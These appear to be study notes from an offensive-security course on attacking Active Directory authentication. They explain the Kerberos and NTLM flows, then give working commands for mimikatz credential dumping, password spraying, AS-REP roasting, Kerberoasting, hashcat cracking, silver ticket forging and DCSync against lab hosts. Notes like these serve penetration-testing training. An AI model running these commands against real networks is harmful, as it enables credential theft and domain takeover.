# Understanding AD Authentication
## NTLM authentication
The client starts authentication process with application server itself.
NTLM authentication - challenge-reponse paradigm.
## Kerberos Authentication
Client Authentication involves the use of a domain controller in the role of KDC. The client starts the authentication process with the KDC and not the application server.
>The AS-REQ contains a timestamp that is encrypted using a hash derived from the password of the user[2](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/understanding-active-directory-authentication/kerberos-authentication#fn2) and their username.

Domain Controller looks up the password hash in NTDS.dit and attempts to decrypt the timestamp.
>If the timestamp is a duplicate, it could indicate evidence of a potential replay attack.

AS-REP from DC to client with:
* Session key - encrypted with user's password hash
* Ticket Granting Ticket - info about user, domain, timestamp, ip address of client, session key; encrypted with krbtgt's password hash; valid for 10 hours; renewal doesn't require the user to re-enter their password.
When the user wants to access resources of the domain, it must again contact the KDC. The client constructs the TGS-REQ.
TGS-REQ:
* current user & timestamp - encrypted with session key
* name of the resource
* encrypted TGT
KDC decrypts TGT with krbtgt's password hash and extract session key to decrypt username and timestamp. KDC checks the following:
* TGT must be a valid timestamp
* The username from TGS-REQ has to match the username from the TGT.
* The client IP address needs to coincide with the TGT ip address.
If success, TGS responds to the client with TGS-REP.
TGS-REP:
* name of the service for which access has been granted & session key to be used between the client and the service - encrypted with session key associated with the creation of the TGT.
* service ticket containing the username and group memberships along with the newly-created session key - encrypted using the password hash of the service account.
Now, the client has a session key and a service ticket.
The client sends the application server AP-REQ. AP-REQ:
* username & timestamp encrypted with the session key associated with the service ticket
* service ticket 
The application server decrypts the service ticket using the service account password hash and extracts the username and session key. Then decrypts the username from AP-REQ using the session key.
If AP-REQ username matches the one decrypted from the service ticket, the request is accepted.
Before granting an access, the service inspects the supplied group memberships in the service ticket and assigns appropriate permissions to the user, after which the user may access the requested service.
## Cached Credentials

Hashes are stored in the Local Security Authority Subsystem Service (LSASS) memory space.
LSASS process is part of the OS and runs as SYSTEM - so we need SYSTEM permissions to gain access to the hashes stored on a target.
In mimikatz enter privilege::debug - engage the SeDebugPrivilege privilege which will allow us to interact with a process owned by another account.
`sekurlsa::logonpasswords` - to dump the creds of all logged-on users with the sekurlsa module.
>An effective defensive technique to prevent tools such as Mimikatz from extracting hashes is to enable additional _LSA Protection_. The LSA includes the LSASS process. By setting a registry key, Windows prevents reading memory from this process. We'll discuss how to bypass this and other powerful defensive mechanisms in-depth in OffSec's _Evasion Techniques and Breaching Defenses_ course, PEN-300.

On old versions of Windows, WDigest will be enabled, so mimikatz will reveal for us passwords in a cleartext.
`sekurlsa::tickets` - to show the tickets that are stored in memory.
Stealing TGS - access only particular resources associated with those tickets.
Stealing TGT - allows us to request a specific TGS for specific service.
With mimikatz we can use crypto module and patch CryptoAPI function with `crypto::capi` or Keylso service with `crypto::cng` making non-exportable keys exportable.
# Performing Attacks on AD Authentication
## Passwords Attacks
`net accounts` - to check password and lockout policy.
Password Spraying through LDAP and ADSI - low and slow. Below is an example:
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```
If the user account is correct, the object creation will be successful:
```
distinguishedName : {DC=corp,DC=com}
Path              : LDAP://DC1.corp.com/DC=corp,DC=com
```
Spray-Passwords.ps1
Password Spraying through SMB - traditional approach, noisy and slow. Below is an example using crackmapexec:
```
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```
Password Spraying through obtaining a TGT - using kinit, uses UDP.
bash script or kerbrute
## AS-REP Roasting
Without Kerberos preauthentication an attack could perform an offline password attack against the encrypted part of the response - AS-REP Roasting
Impacket-GetNPUsers:
```
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
```
`sudo hashcat -m 18200 hashes.asreproast`
Rubeus:
```
.\Rubeus.exe asreproast /nowrap
```
Rubeus will automatically identify vulnerable user accounts. /nowrap to prevent new lines being added to the resulting AS-REP hashes.
To identify domain users with Do not require Kerberos Preauthentication we can use powerview:
`Get-DomainUser -PreauthNotRequired`
While enumerating, we can notice that we have GenericWrite or GenericAll permissions on another AD account, Using these permissions we could reset their passwords. We could also leverage these permissions to modify the User Account Control value of the user to not require Kerberos preauthentication - **Targeted AS-REP Roasting**.
Cracking ASREP hash with hashcat:
```
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
# Kerberoasting
> When requesting the service ticket from the domain controller, no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN.
> These checks are performed as a second step only when connecting to the service itself. This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller.

Kerberoasting with Rubeus:
```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
Kerberoasting with Impacket:
```
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete    
```
>If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use _ntpdate_[3](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/kerberoasting#fn3) or _rdate_[4](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/kerberoasting#fn4) to do so.

As stated before, we could reset the user's password but this may raise suspicion. However, we could also set an SPN for the user,[8](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/kerberoasting#fn8) kerberoast the account, and crack the password hash in an attack named _**targeted Kerberoasting_**.
# Silver Ticket
>_Privileged Account Certificate_ (PAC)[1](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/silver-tickets#fn1) validation[2](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/silver-tickets#fn2) is an optional verification process between the SPN application and the domain controller. If this is enabled, the user authenticating to the service and its privileges are validated by the domain controller. Fortunately for this attack technique, service applications rarely perform PAC validation.

>With the service account password or its associated NTLM hash at hand, we can forge our own service ticket to access the target resource (in our example, the IIS application) with any permissions we desire.

To create a silver ticket we need the following information:
* SPN password hash
* Domain SID
* Target SPN
Confirm an access to the resource of the HTTP SPN:
```
iwr -UseDefaultCredentials http://web04
```
Dump SPN hash with mimikatz.
Obtain the domain sid via `whoami /user`
Target SPN is HTTP/web04.corp.com:80 which is listed in output of Get-DomainUser.
use mimikatz kerberos:golden to create a golden and a silver tickets. Provide /sid, /domain, /target, /service, /rc4. Example:
```
mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```
# Domain Controller Synchronization
Directory Replication Service (DRS) Remote protocol uses replication to synchronize these redundant domain controllers. A DC may request an update for a specific object using the IDL_DRSGetNCChanges API. 
DC doesn't check whether the request came from a known DC.
>To launch such a replication, a user needs to have the _Replicating Directory Changes_, _Replicating Directory Changes All_, and _Replicating Directory Changes in Filtered Set_ rights. By default, members of the _Domain Admins_, _Enterprise Admins_, and _Administrators_ groups have these rights assigned.

dcsync attack - impersonate a DC.
With mimikatz:
```
lsadump::dcsync /user:corp\dave
```
Crack the hash with hashcat:
```
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
With impacket:
```
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```
